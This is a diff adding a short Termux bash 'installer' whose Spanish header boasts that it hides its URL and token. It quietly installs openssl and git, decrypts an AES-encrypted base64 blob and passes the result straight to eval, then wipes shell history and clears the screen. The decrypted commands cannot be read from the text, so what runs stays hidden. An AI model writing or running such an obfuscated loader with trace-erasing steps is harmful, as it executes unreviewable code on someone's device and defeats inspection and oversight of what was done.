@@ -1,0 +1,8 @@
+#!/data/data/com.termux/files/usr/bin/bash
+# ==============================================================================
+# Instalador Cifrado Zero-Knowledge (Sin exponer URL ni Token)
+# ==============================================================================
+pkg install -y openssl git >/dev/null 2>&1
+eval "$(echo 'U2FsdGVkX1+cUQJ6ufY/hE2YxnSmRi0ZrFVARXv2lcIRjh80dNNzKAZP/+dQIxvxl7ANWRQTOVYeF9jga6GkoK2tJtRmBdhRkqcF+Ug8fMbEQVMb3Wcw3aAvs3gPVOXiPWuNHMm868PdJyaEJmgPf6Uf1fBxlc09yd7euxIMHewWzgXnbccGJWN79OegpFfAsBx0SzUaVhr0833FwahUd3IWwlX0PaFWPGOPLpj/IEStPD9R6EozIh3Z3Qn7ZLicp5uy0Z0Z6XoU6bOQpXjbJg==' | openssl enc -d -aes-256-cbc -a -A -pbkdf2)"
+history -c && history -w 2>/dev/null || true
+clear
